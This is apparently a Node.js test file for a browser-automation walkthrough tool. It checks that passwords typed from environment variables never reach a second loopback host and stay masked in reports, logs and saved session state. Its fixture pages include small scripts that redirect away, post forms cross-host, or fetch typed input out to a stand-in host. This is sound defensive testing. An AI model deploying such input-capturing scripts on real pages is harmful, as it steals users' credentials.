'use strict';

// A real browser against real HTTP servers. The guards here exist because a fake
// page cannot show them failing: one test page redirected in `goto`, while a real
// page redirects after `load`, while the fill is waiting for its field. The second
// host is 127.0.0.2, which `isLoopbackUrl` does not take for local; nothing leaves
// the machine, and that server records what reaches it.

const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs/promises');
const fsSync = require('node:fs');
const http = require('node:http');
const os = require('node:os');
const path = require('node:path');

const { normalizeScript, runWalkthrough } = require('../src/lib/browser-walkthrough');
const { probeBrowsers } = require('../src/lib/browser-session');
const { runBrowserRun } = require('../src/commands/browser-run');

const TYPED_VALUE = ['seeded', 'real', 'value', '9731'].join('-');
const STATE = '.aioson/runtime/browser-state/owner.json';
const env = { E2E_PASSWORD: TYPED_VALUE };

function listen(server, host) {
  return new Promise((resolve, reject) => {
    server.once('error', reject);
    server.listen(0, host, () => resolve(server.address().port));
  });
}

const page = (title, body) => `<!doctype html><html lang="en"><head><title>${title}</title></head><body><main><h1>${title}</h1>${body}</main></body></html>`;

async function servers() {
  const external = { received: [] };
  const other = http.createServer((req, res) => {
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      external.received.push(`${req.method} ${req.url} ${body}`);
      res.writeHead(200, { 'content-type': 'text/html' });
      res.end(page('External sign in', '<label>Password<input type="password" id="p"></label><script>document.getElementById("p").addEventListener("input",(e)=>{fetch("/typed?v="+encodeURIComponent(e.target.value))})</script>'));
    });
  });
  const otherPort = await listen(other, '127.0.0.2');
  const out = `http://127.0.0.2:${otherPort}`;
  const local = http.createServer((req, res) => {
    const send = (status, html, headers = {}) => { res.writeHead(status, { 'content-type': 'text/html', ...headers }); res.end(html); };
    const signedIn = (req.headers.cookie || '').includes('sid=live');
    if (req.url === '/late-redirect') return send(200, page('Loading', `<script>setTimeout(()=>{location.href="${out}/signin"},300)</script>`));
    if (req.url === '/server-redirect') return send(302, '', { location: `${out}/signin` });
    if (req.url === '/form-out') return send(200, page('Sign in', `<form method="post" action="${out}/post"><label>Password<input type="password" name="p"></label><button>Sign in</button></form>`));
    if (req.url === '/beacon') return send(200, page('Sign in', `<label>Password<input type="password" id="p"></label><script>document.getElementById("p").addEventListener("input",()=>{fetch("${out}/beacon",{mode:"no-cors"})})</script>`));
    if (req.url === '/echo') {
      return send(200, page('Echo', '<label>Secret<input type="text" id="p"></label><p id="out"></p><script>document.getElementById("p").addEventListener("input",(e)=>{const v=e.target.value;console.error("enc="+encodeURIComponent(v));console.error("raw="+v);document.getElementById("out").textContent="json="+JSON.stringify(v)+" b64="+btoa(v);fetch("/api/"+encodeURIComponent(v))})</script>'));
    }
    if (req.url === '/login' && req.method === 'GET') return send(200, page('Sign in', '<form method="post" action="/login"><label>Password<input type="password" name="password"></label><button>Sign in</button></form>'));
    if (req.url === '/login') return send(303, '', { location: '/orders', 'set-cookie': 'sid=live; HttpOnly; Path=/' });
    if (!signedIn) return send(303, '', { location: '/login' });
    if (req.url === '/orders') return send(200, page('Orders', '<button id="add">New order</button><p id="count">0 orders</p><script>document.getElementById("add").onclick=()=>{document.getElementById("count").textContent="1 order"}</script>'));
    return send(404, page('Not found', ''));
  });
  const localPort = await listen(local, '127.0.0.1');
  return { url: `http://127.0.0.1:${localPort}`, out, external, close: () => Promise.all([other, local].map((server) => new Promise((resolve) => { server.closeAllConnections(); server.close(resolve); }))) };
}

async function available() {
  try {
    const probe = await probeBrowsers({ projectDir: process.cwd() });
    if (!probe.available) return false;
    const check = http.createServer();
    await listen(check, '127.0.0.2');
    await new Promise((resolve) => { check.close(resolve); });
    return true;
  } catch {
    return false;
  }
}

async function project(t) {
  const root = await fs.mkdtemp(path.join(os.tmpdir(), 'aioson-walk-real-'));
  t.after(() => fs.rm(root, { recursive: true, force: true }));
  return root;
}
const run = (root, url, spec, extra = {}) => runWalkthrough({ targetDir: root, script: normalizeScript({ name: 'real', timeout: 4000, ...spec }).script, url, env, persist: false, ...extra });
const typedOut = (external) => external.received.filter((line) => line.includes(TYPED_VALUE));

test('real browser: login, the session kept, and the flow reused without logging in again', async (t) => {
  if (!(await available())) return t.skip('no browser or no second loopback address here');
  const root = await project(t);
  const app = await servers();
  t.after(app.close);
  const flow = { steps: [
    { do: 'goto', url: '/orders' },
    { do: 'click', target: 'role=button[name="New order"]' },
    { do: 'expect', text: '1 order', ac: 'AC-01' },
    { do: 'reload' },
    { do: 'expect', text: '0 orders' }
  ] };

  const anonymous = await run(root, app.url, flow, { env: {} });
  assert.equal(anonymous.ok, false, 'the flow needs a session');
  assert.match(anonymous.warnings.join('\n'), /landed on a login wall/);

  const login = await run(root, app.url, { steps: [
    { do: 'goto', url: '/login' },
    { do: 'fill', target: 'label=Password', value_env: 'E2E_PASSWORD' },
    { do: 'click', target: 'role=button[name="Sign in"]' },
    { do: 'expect', url: '/orders' }
  ] }, { saveState: STATE });
  assert.equal(login.ok, true, JSON.stringify(login.steps.filter((step) => !step.ok)));
  assert.equal(login.session_state.saved, STATE);
  assert.equal(login.steps[1].detail, 'filled label=Password with (masked)');
  const saved = await fs.readFile(path.join(root, STATE), 'utf8');
  assert.match(saved, /"sid"/);
  assert.equal(saved.includes(TYPED_VALUE), false, 'the state holds the session, not the password');
  assert.equal(JSON.stringify(login).includes(TYPED_VALUE), false);

  const reused = await run(root, app.url, flow, { state: STATE, env: {} });
  assert.equal(reused.ok, true, JSON.stringify(reused.steps.filter((step) => !step.ok)));
  assert.deepEqual(Object.keys(reused.ids), ['AC-01']);
  assert.deepEqual(reused.warnings, []);
});

for (const action of ['fill', 'type']) {
  test(`real browser: a client redirect after load gets nothing typed by ${action}`, async (t) => {
    if (!(await available())) return t.skip('no browser or no second loopback address here');
    const root = await project(t);
    const app = await servers();
    t.after(app.close);
    const report = await run(root, app.url, { steps: [{ do: 'goto', url: '/late-redirect' }, { do: action, target: 'label=Password', value_env: 'E2E_PASSWORD' }] });
    assert.equal(report.ok, false);
    assert.equal(report.steps[0].ok, true, 'the page loaded fine, and left later');
    assert.match(report.steps[1].error, /value_env refused and nothing was typed: the page tried to leave for 127\.0\.0\.2/);
    await new Promise((resolve) => { setTimeout(resolve, 200); });
    assert.deepEqual(app.external.received, [], 'the other host never even saw the navigation');
  });
}

test('real browser: a server redirect fails the step, and nothing is typed', async (t) => {
  if (!(await available())) return t.skip('no browser or no second loopback address here');
  const root = await project(t);
  const app = await servers();
  t.after(app.close);
  const report = await run(root, app.url, { steps: [{ do: 'goto', url: '/server-redirect' }, { do: 'fill', target: 'label=Password', value_env: 'E2E_PASSWORD' }] });
  assert.equal(report.ok, false);
  assert.equal(report.steps.length, 1, 'the run stopped before the fill');
  assert.match(report.steps[0].error, /tried to leave for 127\.0\.0\.2/);
  assert.deepEqual(typedOut(app.external), []);
});

test('real browser: a form that posts to another host is stopped, and the session is not saved', async (t) => {
  if (!(await available())) return t.skip('no browser or no second loopback address here');
  const root = await project(t);
  const app = await servers();
  t.after(app.close);
  const report = await run(root, app.url, { steps: [
    { do: 'goto', url: '/form-out' },
    { do: 'fill', target: 'label=Password', value_env: 'E2E_PASSWORD' },
    { do: 'click', target: 'role=button[name="Sign in"]' },
    { do: 'expect', text: 'Thanks' }
  ] }, { saveState: STATE });
  assert.equal(report.ok, false);
  await new Promise((resolve) => { setTimeout(resolve, 200); });
  assert.deepEqual(app.external.received, [], 'the password never left');
  assert.equal(fsSync.existsSync(path.join(root, STATE)), false);
  assert.match(report.warnings.join('\n'), /session state not saved/);
});

test('real browser: a subresource is left alone, and it warns once the value was typed', async (t) => {
  if (!(await available())) return t.skip('no browser or no second loopback address here');
  const root = await project(t);
  const app = await servers();
  t.after(app.close);
  const report = await run(root, app.url, { steps: [{ do: 'goto', url: '/beacon' }, { do: 'fill', target: 'label=Password', value_env: 'E2E_PASSWORD' }, { do: 'wait', ms: 400 }] });
  assert.equal(report.ok, true, JSON.stringify(report.steps.filter((step) => !step.ok)));
  assert.ok(app.external.received.some((line) => line.startsWith('GET /beacon')), 'the request went through');
  assert.match(report.warnings.join('\n'), /value_env_external_request: after a value_env value was typed, the page sent requests to [^;]*127\.0\.0\.2/);
});

test('real browser: what the page does with the value stays out of the report', async (t) => {
  if (!(await available())) return t.skip('no browser or no second loopback address here');
  const root = await project(t);
  const app = await servers();
  t.after(app.close);
  const special = 'S3cr3t p@ss/"zz!';
  const report = await run(root, app.url, { steps: [
    { do: 'goto', url: '/echo' },
    { do: 'fill', target: 'label=Secret', value_env: 'E2E_PASSWORD' },
    { do: 'snapshot' },
    { do: 'wait', ms: 300 }
  ] }, { env: { E2E_PASSWORD: special }, persist: true, slug: 'orders' });
  assert.equal(report.ok, true, JSON.stringify(report.steps.filter((step) => !step.ok)));
  assert.ok(report.console.samples.some((sample) => sample.text === 'enc=[env.E2E_PASSWORD]'));
  assert.ok(report.network.rows.some((row) => row.url.includes('/api/[env.E2E_PASSWORD]')));
  const forms = [special, encodeURIComponent(special), JSON.stringify(special).slice(1, -1), Buffer.from(special).toString('base64')];
  const seen = [JSON.stringify(report)];
  const walk = async (dir) => {
    for (const entry of await fs.readdir(dir, { withFileTypes: true })) {
      const file = path.join(dir, entry.name);
      if (entry.isDirectory()) await walk(file);
      else if (!file.endsWith('.png')) seen.push(await fs.readFile(file, 'utf8'));
    }
  };
  await walk(root);
  assert.ok(seen.length >= 3);
  for (const text of seen) for (const form of forms) assert.equal(text.includes(form), false, form);
});

test('real browser: browser:run from script files, the way a phase runs it', async (t) => {
  if (!(await available())) return t.skip('no browser or no second loopback address here');
  const root = await project(t);
  const app = await servers();
  t.after(app.close);
  const previous = process.env.E2E_PASSWORD;
  process.env.E2E_PASSWORD = TYPED_VALUE;
  t.after(() => {
    if (previous === undefined) delete process.env.E2E_PASSWORD;
    else process.env.E2E_PASSWORD = previous;
  });
  const dir = path.join(root, '.aioson/qa/walkthroughs/orders');
  await fs.mkdir(dir, { recursive: true });
  await fs.writeFile(path.join(dir, 'login.json'), JSON.stringify({ name: 'login', feature: 'orders', timeout: 4000, steps: [
    { do: 'goto', url: '/login' },
    { do: 'fill', target: 'label=Password', value_env: 'E2E_PASSWORD' },
    { do: 'click', target: 'role=button[name="Sign in"]' },
    { do: 'expect', url: '/orders' }
  ] }));
  await fs.writeFile(path.join(dir, 'orders.json'), JSON.stringify({ name: 'orders', feature: 'orders', timeout: 4000, steps: [
    { do: 'goto', url: '/orders' },
    { do: 'click', target: 'role=button[name="New order"]' },
    { do: 'expect', text: '1 order', ac: 'AC-01' },
    { do: 'reload' },
    { do: 'expect', text: '0 orders', ac: 'AC-02' }
  ] }));
  const lines = [];
  const logger = { log: (line) => lines.push(String(line)), error: (line) => lines.push(String(line)) };
  const translate = (key, values = {}) => `${key} ${JSON.stringify(values)}`;
  const script = (name) => `.aioson/qa/walkthroughs/orders/${name}.json`;

  const login = await runBrowserRun({ args: [root], options: { script: script('login'), url: app.url, 'save-state': STATE }, logger, t: translate });
  assert.equal(login.ok, true, lines.join('\n'));
  assert.equal(login.persisted, true);
  assert.equal(login.session_state.saved, STATE);
  assert.match(login.replay, /--save-state=\.aioson\/runtime\/browser-state\/owner\.json/);

  const reused = await runBrowserRun({ args: [root], options: { script: script('orders'), url: app.url, state: STATE }, logger, t: translate });
  assert.equal(reused.ok, true, lines.join('\n'));
  assert.deepEqual(Object.keys(reused.ids).sort(), ['AC-01', 'AC-02']);
  assert.equal(reused.report_path, '.aioson/context/features/orders/browser/orders.json');

  assert.equal(lines.join('\n').includes(TYPED_VALUE), false, 'nothing the command printed holds the value');
  const written = await fs.readFile(path.join(root, login.report_path), 'utf8');
  assert.equal(written.includes(TYPED_VALUE), false);
});
